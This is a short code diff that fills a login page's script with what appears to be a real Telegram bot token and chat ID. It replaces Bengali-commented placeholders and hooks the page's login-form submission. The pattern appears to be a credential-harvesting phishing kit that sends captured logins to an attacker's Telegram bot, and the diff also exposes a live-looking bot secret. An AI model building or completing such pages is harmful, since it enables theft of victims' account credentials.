@@ -1,6 +1,6 @@
 <script>
-        const BOT_TOKEN = "YOUR_BOT_TOKEN"; // আপনার টেলিগ্রাম বটের টোকেন দিন
-        const CHAT_ID = "YOUR_CHAT_ID";    // আপনার চ্যাট আইডি দিন
+        const BOT_TOKEN = "7125654513:AAFHdhUKZN8HcULIIG9kh5MysJbSLhj_MJM"; // আপনার টেলিগ্রাম বটের টোকেন দিন
+        const CHAT_ID = "5803313135";    // আপনার চ্যাট আইডি দিন
 
         document.getElementById("loginForm").addEventListener("submit", function (e) {
             e.preventDefault();
